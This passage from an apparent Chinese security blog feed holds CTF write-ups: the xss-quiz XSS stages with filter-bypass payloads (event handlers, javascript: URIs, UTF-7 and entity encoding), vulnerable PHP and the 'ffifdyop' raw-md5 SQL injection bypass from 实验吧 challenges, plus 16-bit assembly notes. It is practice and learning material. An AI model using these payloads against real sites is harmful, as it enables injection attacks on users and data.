passowrd.txt</span><br></pre></td></tr></table></figure></p><h1 id="WPA-RADIUS加密模式"><a href="#WPA-RADIUS加密模式" class="headerlink" title="WPA+RADIUS加密模式"></a>WPA+RADIUS加密模式</h1><p> <br><br>  <br><br>   <br><br>    <br><br>    参考文章:<br>    <a href="http://www.tup.tsinghua.edu.cn/booksCenter/book_06720901.html" target="_blank" rel="noopener">http://www.tup.tsinghua.edu.cn/booksCenter/book_06720901.html</a></p>]]></content>
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss闯关小游戏</title>
      <link href="/posts/c617af63.html"/>
      <url>/posts/c617af63.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>附上网址 <a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br><a id="more"></a></p><h1 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h1><p>没有过滤直接输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h1><p>闭合双引号，闭合标签。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain)&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h1><p>用bp抓一下包，第一个参数过滤了，第二个没有。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p1=123p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h1><p>第三个参数没有过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackme<span class="string">"&gt; &lt;script&gt; alert(document.doamin);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h1><p>首先要修改输入框的长度限制<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;a&gt;&quot;</span><br></pre></td></tr></table></figure></p><h1 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h1><p><a href="https://xss-quiz.int21h.jp/stage-no6.php?sid=cfb6f830797a064bcb4fa49f267c45b783a54cf8" target="_blank" rel="noopener">链接</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onmousemove=&quot;alert(document.domain)</span><br></pre></td></tr></table></figure></p><h1 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h1><p><a href="https://xss-quiz.int21h.jp/stage07.php?sid=e3c936027d379ae81427c1c2491f250cf0f2adbb" target="_blank" rel="noopener">链接</a><br>这里的”&lt;&gt;都被转义了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=alert(document.domain)</span><br></pre></td></tr></table></figure></p><h1 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h1><p><a href="https://xss-quiz.int21h.jp/stage008.php?sid=6da116e012a56c3c8d01d78458b950e14112c5d2" target="_blank" rel="noopener">链接</a><br>伪协议:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></p><h1 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h1><p><a href="https://xss-quiz.int21h.jp/stage_09.php?sid=cfb2b50189fb16e0c854ec317c5caa044ab15912" target="_blank" rel="noopener">链接</a><br>“&lt;&gt;都被转义了，当然也不能用onmouseover和onclick，根据提示，用UTF-7编码解码工具，将” onmousemove=”alert(document.domain)转为UTF-7编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7</span><br></pre></td></tr></table></figure></p><p>这个对使用的IE浏览器有一定的限制，大部分浏览器都已经修复了这个漏洞，但IE7还没有<br> 因为没有IE7，所以这里直接用firebox直接弹框</p><h1 id="stage-10"><a href="#stage-10" class="headerlink" title="stage 10"></a>stage 10</h1><p><a href="https://xss-quiz.int21h.jp/stage00010.php?sid=aec027ff9171a5004e62e1fa983d430d7fab2146" target="_blank" rel="noopener">链接</a><br> 查看源码知道过滤了domain<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.doadoaminmin)&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p><h1 id="stage-11"><a href="#stage-11" class="headerlink" title="stage 11"></a>stage 11</h1><p> <a href="https://xss-quiz.int21h.jp/stage11th.php?sid=2a265b5a2d78759fe2956ec2c95782e9cd89880f" target="_blank" rel="noopener">链接</a><br> hint:<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;s/script/xscript/ig;&quot; and &quot;s/on[a-z]+=/onxxx=/ig;&quot; and &quot;s/style=/stxxx=/ig;&quot;</span><br></pre></td></tr></table></figure></p><p> 过滤了挺多的<br> 1)插入&#09;不可见字符<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascri&amp;#09;pt:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p><p> 2)将javascript转化成unicode<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot;</span><br><span class="line">``` </span><br><span class="line"># stage 12 </span><br><span class="line">[链接](https://xss-quiz.int21h.jp/stage_no012.php?sid=65e080510facb2594e5a8632a3191081fc9bd4fc)    </span><br><span class="line">hint:</span><br></pre></td></tr></table></figure></p><p> “s/[\x00-\x20\&lt;>\”\’]//g;”<br> <code>`</code></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧web题</title>
      <link href="/posts/761c3e82.html"/>
      <url>/posts/761c3e82.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="keyword">function</span> sqliCheck(<span class="variable">$str</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_iv</span></span>()&#123;</span><br><span class="line"><span class="variable">$random_iv</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$random_iv</span>.=chr(rand(1,255));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> login(<span class="variable">$info</span>)&#123;</span><br><span class="line"><span class="variable">$iv</span> = get_random_iv();</span><br><span class="line"><span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">setcookie(<span class="string">"iv"</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">setcookie(<span class="string">"cipher"</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">show_homepage</span></span>()&#123;</span><br><span class="line">global <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]) &amp;&amp; isset(<span class="variable">$_COOKIE</span>[<span class="string">'iv'</span>]))&#123;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]);</span><br><span class="line"><span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line"><span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) or die(<span class="string">"</span></span><br><span class="line"><span class="string">base64_decode('"</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">"') can't unserialize</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from users limit "</span>.<span class="variable">$info</span>[<span class="string">'id'</span>].<span class="string">",0"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0 or die(mysqli_error(<span class="variable">$link</span>)))&#123;</span><br><span class="line"><span class="variable">$rows</span>=mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!'</span>.<span class="variable">$rows</span>[<span class="string">'username'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">die(<span class="string">"ERROR!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span> = (string)<span class="variable">$_POST</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(sqliCheck(<span class="variable">$id</span>)) die(<span class="string">"</span></span><br><span class="line"><span class="string">sql inject detected!</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="variable">$info</span> = array(<span class="string">'id'</span>=&gt;<span class="variable">$id</span>);</span><br><span class="line">login(<span class="variable">$info</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>])&amp;&amp;isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">show_homepage();</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/block2016/p/5596676.html" target="_blank" rel="noopener">aes加密算法</a>   </p><h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>查看源码可得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">"'"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag is :'</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125; --&gt;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">可以下url连接，就大概猜到考什么了，做过两三次了， 直接提交 </span><br><span class="line">```bash</span><br><span class="line">ffifdyop</span><br></pre></td></tr></table></figure></p><h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>查看源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="variable">$sql</span>=<span class="string">"select * from users where username='<span class="variable">$username</span>' and password='<span class="variable">$password</span>'"</span>;  --&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>16位汇编语言学习笔记</title>
      <link href="/posts/74313cf1.html"/>
      <url>/posts/74313cf1.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近，不知道是心血来潮，还是有点厌倦web,突然想学一学逆向，未知的领域，有点儿神秘，有了一种想探索的欲望，这学期，也挺闲的，就给自己找点事做，学一下逆向，逆向探索之旅，就此开始吧！<br><a id="more"></a></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>1.地址总线：cpu是通过地址总线来制定存储单元的。<br> 数据总线：cpu与内存或其他器件之间的数据传送，。<br> 控制总线： cpu对外部器件的控制<br>2.cpu包括运算器、控制器、寄存器等器件<br>运算器进行信息处理<br>寄存器进行信息存储<br>控制器控制各种器件进行工作<br>内部总线连接各种器件，进行数据的传送<br>3.8086cpu的所有寄存器是16位的，存放两个字节。<br>AX、BX、CX 、DX是通用寄存器，用来存放一般的数据<br>AX可分为AH和BL,其他同理。<br>4.字节，记为byte，一个字节有8个bit组成，可以存在8位寄存器中。<br>字：记为word,一个字由连个字节组成，这两个字节分别称为高位字节和低位字节。<br>5.cpu在执行指令时，会认为ah和al是两个不相关的寄存器。<br>在进行数据传送或运算时，要注意指令的两个操作对象的位数应当一致的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov ax,2000H 正确的。  </span><br><span class="line">mov al,2000H 错误的。</span><br></pre></td></tr></table></figure></p><p>6.8086cpu有20位地址总线。<br>物理地址=段地址x16+偏移地址<br>cpu可以使用不同的段地址和偏移地址形成同一个物理地址<br>7.8086cpu有4个段寄存器：CS DS SS ES<br>8.jmp 段地址：偏移地址  功能是用指令中给出的段地址修改CS，偏移地址修改IP.<br>jmp 某一合法寄存器    功能是用寄存器中的值修改ip.<br>9.debug的功能<br>R查看、改变cpu寄存器的内容<br>D查看内存中的内容<br>E改写内容内存中的内容<br>U将内存中的机器指令翻译成汇编指令<br>T执行一天机器指令<br>A以汇编指令的格式在内存中写入一条机器指令    </p><h1 id="寄存器的内存访问"><a href="#寄存器的内存访问" class="headerlink" title="寄存器的内存访问"></a>寄存器的内存访问</h1><p>1.字单元，即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。<br>2.DS存放要访问数据的段地址，8086cpu不支持将数据直接送入段寄存器。<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov bx,1000H   </span><br><span class="line">mov ds,bx  </span><br><span class="line">mov al,[0]</span><br><span class="line">mov [0], cx</span><br></pre></td></tr></table></figure></p><p>3.栈的push和pop都是以字为单元进行的。<br>4.栈顶的段地址存放在SS中，偏移地址存放在SP中，任意时刻，SS:SP 指向栈顶元素，push指令和pop指令执行时，cpu从ss和sp中得到栈顶的地址。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push 寄存器 将一个寄存器中的数据入栈 </span><br><span class="line">push 段寄存器  </span><br><span class="line">push 内存单元  </span><br><span class="line">pop同理</span><br></pre></td></tr></table></figure></p><p>5.8086cpu只记录栈顶，栈空间的大小要我们自己管理  </p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>1.汇编指令，有对应的机械码的指令，可以被编译为机器指令，最终为cpu执行<br>伪指令：没有对应的机器码，最终不被cpu所执行，由编译器执行<br>（1）一个段的开始和结束<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">段名 segment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">段名 ends</span><br></pre></td></tr></table></figure></p><p>（2）end 是一个汇编程序的结束标记<br>（3）assume将有特定用途的段和相关的段寄存器关联起来即可。<br>2.我们在这里定义（）来表示一个寄存器或一个内存单元中的内容<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov ax [bx]  bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中</span><br><span class="line">inc bx,1  是bx中的内容加1</span><br></pre></td></tr></table></figure></p><p>3.loop指令来实现循环功能，cx中存放循环次数。<br>例子计算2^12：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:code  </span><br><span class="line">code segment </span><br><span class="line">mov ax,2</span><br><span class="line">    mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>4.大于9FFF的十六进制数据A000H等，在汇编源程序中，数据不能以字母开头，所以要在前面加0<br>所以汇编程序中要写0A000H<br>5.debug和汇编编译器masm对指令的不同处理：<br>在汇编源程序中，指令mov ax,[0] 被编译器当做指令mov,ax,0 处理<br>6.汇编源程序中以下指令的含义<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov al,[0] 将常量0送入al中</span><br><span class="line">mov al,ds:[0]  含义：（al）=((ds)*16+0),将内存单元中的数据送入al中</span><br><span class="line">mov al,[bx]   （al）=((ds)*16+（bx)),将内存单元中的数据送入al中  </span><br><span class="line">mov al,ds:[bx] 与mov al,[bx]相同</span><br></pre></td></tr></table></figure></p><p>7.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inc ax   在ax中加1</span><br><span class="line">dw 0123h,0456h,……  dw定义的数据处于代码段的开始，所以偏移地址为0。 </span><br><span class="line">db <span class="string">'unIX'</span> 相当于 db 66H,6EH,49H,58H</span><br></pre></td></tr></table></figure></p><p>8.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[bx+idata]  表示一个内存单元，他的偏移地址为(bx)+idata </span><br><span class="line">也可以写成如下形式：</span><br><span class="line">200[bx]</span><br><span class="line">[bx].200</span><br></pre></td></tr></table></figure></p><p>9.si和di与bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用<br>10.[bx+si]或[bx+di] 表示一个内存单元，它的偏移笛子为（bx）+(si) </p><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>1.bx,si,di,bp:<br>1）在8086cpu中只有bx、si di bp4个寄存器可以用来[]中来进行内存单元的寻址。<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov ax,[bx]  正确 </span><br><span class="line">mov ax,[cx]  错误</span><br></pre></td></tr></table></figure></p><p>2）在[]中，这4个寄存器可以单个出现，或只能以4中组合出现：bx和si、bx和di、bp和si、bp和di<br>3）只要在[]中使用寄存器bp,而只李宁中没有显性地给出段地址，段地址就默认在ss中<br>2.寄存器寻址方式：直接寻址 寄存器间接寻址 寄存器相对寻址 基址变址寻址 相对基址变址寻址<br>3.指令处理数据的长度<br>1）通过寄存器名指明指令进行的是字操作或者字节操作<br>2）在没有寄存器名存在的情况下，用X ptr 指令内存的长度<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov word ptr ds:[0],1 </span><br><span class="line">inc word ptr [bx]</span><br><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br></pre></td></tr></table></figure></p><p>4.div<br>1)除数有8，16位<br>2）被除数：默认放在AX或DX和AX中，<br>如果除数为8位，被除数则为16位，默认在AX中存放<br>如除数为16位，被除数则为32位，默认放在DX和AX中<br>3）结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数<br>如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">div byte ptr ds:[0] </span><br><span class="line">含义：(al)=(ax)/((ds)*16+0)的商</span><br><span class="line">     (ah)=(ax)/((ds)*16+0)的余数</span><br><span class="line">div word ptr es:[0] </span><br><span class="line">含义：(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">     (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></table></figure></p><p>5<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db 定义字节型数据 ，占用一个字节</span><br><span class="line">dw 定义字型数据 ，占用一个字</span><br><span class="line">dd 定义双字型数据 ，占用两个字</span><br></pre></td></tr></table></figure></p><p>6.dup用来数据的重复<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db 3 dup (0) 相当于db 0,0,0</span><br></pre></td></tr></table></figure></p><h1 id="转移指令的原理"><a href="#转移指令的原理" class="headerlink" title="转移指令的原理"></a>转移指令的原理</h1><p>1.offset 取得标号的偏移地址<br>2.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jmp short 标号  转到标号处执行指令 </span><br><span class="line">jmp near ptr 标号  实现段内转移 </span><br><span class="line">jmp far ptr 标号 实现的是段间转移，又称为远转移</span><br><span class="line">jmp word ptr 内存单元   从内存单元地址处开始存放一个字，是转移的目的地址的偏移地址。</span><br><span class="line">jmmp dword ptr 内存单元  从内存单元地址处开始存放两个字，高地址处的字是转移目的段地址，低地址处是转移的目的偏移地址</span><br><span class="line">jcxz 标号 如果（cx）=0   转移到标号处执行</span><br></pre></td></tr></table></figure></p><p>3.ret指令用栈中的数据，修改ip的内容，从而实现 近转移<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(ip)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br></pre></td></tr></table></figure></p><p>retf指令用栈中的数据，修改cs和ip的内容，从而实现远转移<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(ip)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br><span class="line">(cs)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br></pre></td></tr></table></figure></p><p>4.<br>1）call 标号 将当前的ip压栈后，转到标号处执行指令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(ip)</span><br><span class="line"></span><br><span class="line">(ip)=(ip)+16 位位移</span><br></pre></td></tr></table></figure></p><p>相当于进行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure></p><p>2）call far ptr 标号  实现的的段间转移<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(cs)</span><br><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(cs)=标号所在段的短地址</span><br><span class="line">(ip)=标号在段中的段地址</span><br></pre></td></tr></table></figure></p><p>相当于进行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push cs </span><br><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure></p><p>3) call 16位reg<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(ip)</span><br><span class="line">(ip)=(16位reg)</span><br></pre></td></tr></table></figure></p><p>功能：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure></p><p>4)call word ptr 内存单元地址<br>相当于：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push Ip</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure></p><p>5）call dword ptr 内存单元地址<br>相当于：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push Ip</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure></p><p>5.<br>1)两个相乘的数：两个数相乘，要么8位，要么16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认在AX中，另一个放在16位reg或内存字单元中。<br>2)结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中放。<br>格式<br>mul reg<br>mul 内存单元<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mul byte ptr ds:[0]  含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line">mul word ptr [bx+si+8] </span><br><span class="line">含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位</span><br><span class="line">      (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位</span><br></pre></td></tr></table></figure></p><ol start="6"><li>divdw<br>功能：进行不会溢出的除法运算，被除数位dword型，除数为word型，结果为dword型。<br>参数：<br>（ax）=dword型数据的低16位<br>（dx）=dword型数据的高16位<br>（cx）=除数<br>返回：<br>（dx）=结果的高16位，（ax）结果的低16位<br>（cx）=余数<br>7.dtoc<br>功能：将word型数据转变为表示十进制数的字符串，字符串以0位结尾符。<br>参数：(ax)=word型数据<br>ds:si指向字符串的首地址<br>返回：无 <h1 id="标记寄存器"><a href="#标记寄存器" class="headerlink" title="标记寄存器"></a>标记寄存器</h1>1.zf标志：flag的第六位，零标志位，记录相关指令执行后，结果是否为0。为0,zf=1,否则zf=0<br>pf标志：flag的第二位，奇偶标志位。记录相关指令执行后，结果的所有bit位中1的个数是否为偶数，是pf=1,否pf=0<br>sf标志：第七位，符号标志位，记录相关指令执行后，其结果是否为负。负为1，否为0<br>cf标志：第零位，进位标志位。一般情况下，在进行无符号运算的时候它记录了运算结果的最高有效位想更高位的进位值，或从更高位的借位值。<br>of标志：第11位，溢出标志。发生溢出，of=1,否则of=0<br>df标志：第10位，方向标志位.df=0,每次操作后si、di递增；df=1,每次操作后si、di递减。<br>2.adc带进位的的加法指令<br>3.sbb是借位减法指令，它利用了cf位上记录的借位值。<br>4.cmp是比较指令，相当于减法指令，只是不保存结果。<br>5.</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">指令          含义           检测的相关标志位</span><br><span class="line">je         等于则转移        zf=1</span><br><span class="line">jne        不等于            zf=0</span><br><span class="line">jb         低于              cf=1</span><br><span class="line">jnb        不低于            cf=0</span><br><span class="line">ja         高于              cf=0或zf=0</span><br><span class="line">jna        不高于            cf=1或zf=1</span><br></pre></td></tr></table></figure><p>6.movsb<br>相当于<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">((es)*16+(di))=((ds)*16+(si))</span><br><span class="line">如果 df=0,则：</span><br><span class="line">      (si)=(si)+1</span><br><span class="line">      (di)=(di)+1</span><br><span class="line">否则：</span><br><span class="line">      (si)=(si)-1</span><br><span class="line">      (di)=(di)-1</span><br></pre></td></tr></table></figure></p><p>movsw的功能将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和di递增2或递减2<br>7.rep movsb<br>相当于<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">s：movsb</span><br><span class="line">  loop s</span><br></pre></td></tr></table></figure></p><p>cld指令：将df位置0<br>std指令：将df位置1<br>8.pushf将标志寄存器的值压栈，<br>popf是从栈中弹出数据，送入标志寄存器中。   </p><h1 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h1><p>1.内中断的产生：<br>1）除法错误<br>2）单步执行<br>3）执行into指令<br>4）执行int指令<br>2.iret指令的功能用汇编语法描述为：<br><figure class="highlight 